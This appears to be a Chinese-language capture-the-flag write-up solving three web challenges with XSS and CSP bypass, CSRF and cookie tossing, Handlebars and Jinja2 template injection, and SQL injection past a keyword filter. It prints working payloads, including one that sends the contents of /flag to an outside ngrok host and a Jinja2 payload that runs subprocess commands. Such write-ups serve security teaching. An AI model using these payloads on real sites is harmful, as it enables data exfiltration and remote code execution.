# Profile Card

這題有個需要登入之後才能操作的網站，flag 是在 admin 才能存取的 `/flag` 裡面，所以第一個目標是要先在上面弄出 XSS 來才行。

登入之後可以看到它有幾個功能:

* Edit: 可以編輯頭像 url, title 和 bio (support markdown)
* Reset: 重設
* Export as html: 匯出為 html，會直接觸發瀏覽器的下載
* Export as markdown: 匯出為 md，會直接觸發瀏覽器的下載
* FLAG: Admin 才能存取的 `/flag`
* Report to Admin: 通過 PoW 之後可以 submit 給 Admin Bot 去瀏覽

顯然目標是要透過 Edit 的功能去觸發 XSS，測試一下 bio 可以知道它能塞一些 html 進去，但是可以注意到 `<script>` 會被強制替換為 `<bad>`。此時自然會想到能不能利用 `<img src=1 onerror=alert(1)>` 繞過，測試一下會發現它有成功出現在 html 中，但是會觸發 CSP 的 `script-self 'self'` 規則。

完整的 CSP:
```
default-src 'none'; base-uri 'none'; connect-src 'self'; img-src http: https:; style-src 'self'; script-src 'self'
```

`script-src` 的繞過方法顯然是要找有沒有 host 在同個網站上的其他頁面可以 serve 自己的 payload。這個可以很容易的在 Export as markdown 功能的 `/export?format=markdown` 找到，所以只要能有 `<script src="/export?format=markdown"></script>` 就有機會觸發 XSS。

這邊會遇到個困難點是 `<script>` 就算有 attribute 也還是會被轉換成 `<bad>`，我這邊的做法是利用 `<iframe srcdoc="..."></iframe>`，然後其中的 payload 使用 `&#x3c;&#x73;&#x63;...` 格式的 html entities 去 encode，這樣就能繞過 filter。

> 生成 payload 的工具我用的是 [CyberChef](https://gchq.github.io/CyberChef/#recipe=To_HTML_Entity(true,'Hex%20entities')&input=PHNjcmlwdCBzcmM9Ii9leHBvcnQ/Zm9ybWF0PW1hcmtkb3duIj48L3NjcmlwdD4) 去 encode 的

目前已經可以讓它載入 `<script src="/export?format=markdown"></script>`，下個目標是要讓 markdown 內容成為 legal 的 js 才能 xss。

其 markdown 格式如下:

```
[![](/static/default-avatar.png)](https://github.com/username)

# @username

### Title

---

Bio
```

其中 url, username, title 和 bio 都是可控的，所以可以讓 url 成為 `alert(1))]/*`，而 Bio 的最後面(`</iframe>` 後面)加上 `*/` 就能讓整個 markdown 成為正常的 js 去觸發 XSS。

XSS 之後就 `fetch('/flag')`，然後因為 `connect-src 'self';` 的關係，需要用 `top.location = 'https://YOUR_SERVER/?' + flag` 這樣的方法把 flag 回傳。

完整 payload:

avatar url:

```
fetch('/flag').then(r=>r.text()).then(t=>top.location='https://49dc-140-115-216-194.ngrok.io?'+t))]/*
```

bio:

```
<iframe srcdoc="&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x20;&#x73;&#x72;&#x63;&#x3d;&#x22;&#x2f;&#x65;&#x78;&#x70;&#x6f;&#x72;&#x74;&#x3f;&#x66;&#x6f;&#x72;&#x6d;&#x61;&#x74;&#x3d;&#x6d;&#x61;&#x72;&#x6b;&#x64;&#x6f;&#x77;&#x6e;&#x22;&#x3e;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;"></iframe>*/
```

不過到這邊也只達成了 Self-XSS，要找個方法讓這個 XSS 也能應用在 Bot 上面才行。這個部分我知道的目前除了 intended 的一個解以外還有兩個 unintended 的解，我是用其中一個 unintended 解的。

## Intended

> 我用的不是這個方法，所以這邊只有簡單說明

題目提示就有說 CSRF，檢查一樣可以知道有 `SameSite=None`，所以我們可以 `POST /api/update` 去 CSRF 設定 admin 的內容到前面可以 XSS 的 payload 即可。不過 POST 的結果會是個 json，所以自己的頁面上可以利用 `window.open` 去開多個 tab，然後一個頁面去 CSRF，另一個頁面 delay 一下之後再讓它去瀏覽 `https://profile.chal.h4ck3r.quest/` 就有 flag 了。

## Unintended 1

> 我用的不是這個方法，所以這邊只有簡單說明

這個一樣是 CSRF，不過方向不太一樣，就算是 `SameSite=Lax` 應該也有用。這次是利用 CSRF 去 `POST /login`，讓 admin 去 login 自己的帳號然後觸發 XSS。這個做法有個問題在於 `/flag` 需要的是 admin 的 cookie，`POST /login` 之後就會把 cookie 給蓋掉了，就算 XSS 也拿不到 flag。

這邊的一個做法是在 CSRF **之前**讓頁面上的一個 iframe 載入 `https://profile.chal.h4ck3r.quest/flag`，然後 `window.open` 於新分頁 `POST /login` 觸發 XSS，只是這次 XSS 的內容會從 `window.opener.frames[0].document.body.textContent` 拿 flag 而已。

不用 iframe 而單純用 `window.opener` chain 起來也是可以做到，參考 [pbctf 2021 TBDXSS](https://blog.maple3142.net/2021/10/11/pbctf-2021-writeups/#tbdxss)。

## Unintended 2

> 這個是我真正使用的作法

可以注意到這題的 domain 是 `profile.chal.h4ck3r.quest`，而另一題 Imgura 是 `imgura.chal.h4ck3r.quest`，兩個網站是 `chal.h4ck3r.quest` 底下的不同 subdomain。

顯然，`chal.h4ck3r.quest` 不在 [Public Suffix List](https://publicsuffix.org/) 之中，儘管不能直接繞過同源政策，但兩個 domain 還是能在一定程度下產生一些影響，例如修改 cookie。

`imgura.chal.h4ck3r.quest` 雖然沒辦法直接改 `profile.chal.h4ck3r.quest` 的 cookie，但還修改 `chal.h4ck3r.quest` 的 cookie 倒是沒有問題。

此時如果用 `document.cookie = 'session=peko; domain=chal.h4ck3r.quest; path=/2f/'`，下次瀏覽 `https://profile.chal.h4ck3r.quest/%2f/` 的時候所用的 cookie 將會是
`session=peko`。這是因為瀏覽器(至少 Chromium 會這樣)會優先挑選比較 specific 的 path。

所以只要把 `/%2f/` 和 `/export` 兩個 path 都改成你 self xss 的 session，之後重新瀏覽到 `https://profile.chal.h4ck3r.quest/%2f/` 去的時候就能觸發 XSS。

> `/%2f/` 會在 nginx 那邊被解讀為 `/`，但是瀏覽器是把它視為正常的 path

所以就用之前解 Imgura 的方法，在 png 後面接上一些 html:

```html
<script>
document.cookie = 'session=eyJwb3dfcHJlZml4IjpudWxsLCJ1c2VybmFtZSI6InBla29taWtvIn0.YYSezg.72uO38n2SN7G4m0ZCLrGt711dOo; domain=chal.h4ck3r.quest; path=/%2f/'
document.cookie = 'session=eyJwb3dfcHJlZml4IjpudWxsLCJ1c2VybmFtZSI6InBla29taWtvIn0.YYSezg.72uO38n2SN7G4m0ZCLrGt711dOo; domain=chal.h4ck3r.quest; path=/export'
location.href = 'https://profile.chal.h4ck3r.quest/%2f/'
</script>
```

然後上傳拿到 path:

```zsh
curl 'https://imgura.chal.h4ck3r.quest/dev_test_page/upload.php' -F'image_file=@test.png.html' -v
```

之後再讓 bot 去瀏覽 `https://imgura.chal.h4ck3r.quest/dev_test_page/images/4031953e_test.png.html` 之類的頁面就能 XSS 拿 flag。

FLAG: `FLAG{W0W_you_expl0ited_th3_s3lf_xss}`

# Double SSTI

這題可以在 `/source` 看到原始碼，關鍵部分如下:

```javascript
app.get("/welcome", (request, response) => {
    const name = request.query.name ?? 'Guest';
    if (name.includes('secret')) {
        response.send("Hacker!");
        return;
    }
    const template = handlebars.compile(`<h1>Hello ${name}! SSTI me plz.</h1>`);
    response.send(template({ name, secret }));
})
```

可以知道說有個 SSTI，目標是要拿到 `secret` 的值才能進第二階段。第一個想到的做法是直接 `{{secret}}` 去讀 `secret`，但是這個會被它的 filter 擋住。

這邊我有找到兩個繞法，第一個是用 `?name[]={{secret}}`，這樣 `request.query.name` 會是一個只有一個元素的 array 能通過 filter 的檢查，而它在轉換成字串的時候也能成功達成想要的目標。

另一個方法是利用 Handlebars 本身的功能，可以用 `{{#each this}}` 去得到目前 `this` 物件的所有值:

```
{{#each this}}{{@key}}={{this}},{{/each}}
```

拿到 `secret == "77777me0w_me0w_s3cr3t77777"` 可以到 `http://h4ck3r.quest:10005/2nd_stage_77777me0w_me0w_s3cr3t77777` 對 Jinja2 (Flask) 做 SSTI，不過這次可以發現它有幾個 filter 包括 `.` `[` `]` 和 `__`，前面三個可以很容易的用 `|` 和 `attr` 去繞，後面的就單純用字串拚接即可:

```python
{{g|attr('pop')|attr('_'*2+'globals'+'_'*2)|attr('get')('_'*2+'builtins'+'_'*2)|attr('get')('_'*2+'import'+'_'*2)('subprocess')|attr('check_output')(('cat','/y000_i_am_za_fl4g'))}}
```

# Log me in: FINAL

這題只有個登入畫面，隨便進一個不存在的 path 會出現錯誤頁面，所以可知後端是使用 Ruby 的 Sinatra 框架。從[這邊](https://github.com/sinatra/sinatra/blob/2e980f3534b680fbd79d7ec39552b4afb7675d6c/lib/sinatra/base.rb#L1875)能看出說它既然出現了這個畫面就代表 server 是跑在 development mode 的。

在 POST login 的時候少 username 或是 password 其中一個的時候就能觸發錯誤，裡面可以看到一部份的原始碼:

> `User-Agent` 不能包含 `curl`，不然 Sinatra 會[自動](https://github.com/sinatra/sinatra/blob/cf404526373298f06a59e1a129b6cdf8282ae216/lib/sinatra/show_exceptions.rb#L58)把錯誤畫面顯示的資訊減少，讓資訊比較好讀

```rb
db = Mysql2::Client.new(host: 'mysql', username: 'root', password: 'pa55w0rd', database: 'db')

def sqli_waf (str)
    str.gsub(/union|select|where|and|or| |=/i, '')
end

def addslashes (str)
    str.gsub(/['"]/,'\\\\\0')
end

get '/' do
    p %{
    <h1>Log me in: Final</h1>
    <form method="POST" action="/login">
        <input type="text" name="username" placeholder="guest">
```

```rb
        <button>Login</button>
    </form>
    }
end

post '/login' do
    @params = Hash[params.map { |key, value| [key, sqli_waf(value)] }]
    query = "SELECT * FROM users WHERE username='#{addslashes(@params['username'])}' and password='#{addslashes(@params['password'])}'"
    result = db.query(query).first
    if result
        "Welcome!"
    else
        "Incorrect username or password."
    end
end
```

可以知道它有個 waf 會把一些 keyword 以及空白和等號給移除掉，然後再用 `addslashes` 把 `'` 和 `"` 變成 `\'` 和 `\"`。

keyword 的部份因為它是用 replace 處理的，所以可以利用 `selselectect` 這樣的方式讓它被 replace 之後變成 `select` 來繞。空白字元直接用註解 `/**/` 就能繞過了，等號我沒想到怎麼繞，但是不需要等號也是能拿到 flag 的。`addslashes` 的話只需要傳送 `\'`，它就會被 replace 成為 `\\'`，這樣一樣能 sql injection。

能 injection 之後也還不能簡單的拿到 flag，因為它的 response 都是固定的字串。一個能用的做法是用 boolean 或是 time based blind 去弄，但是因為這個是一個 development mode 的 Sinatra server，合理預期 error based 也能用。

測試一下 `' union select extractvalue(rand(),concat(0x3a,version())),2,3;#` 可以正確拿到 mysql version，剩下的就從 `information_schema` 裡面用 `group_concat` 快速撈 table name，然後拿出 flag 即可。

一個比較坑人的地方是它存 flag 的 table name 是 `h3y_here_15_the_flag_y0u_w4nt,meow,flag`，裡面有包含逗號，所以對於使用 `group_concat` 的人容易誤判 table name，然後在想怎麼這個 table 不存在...。
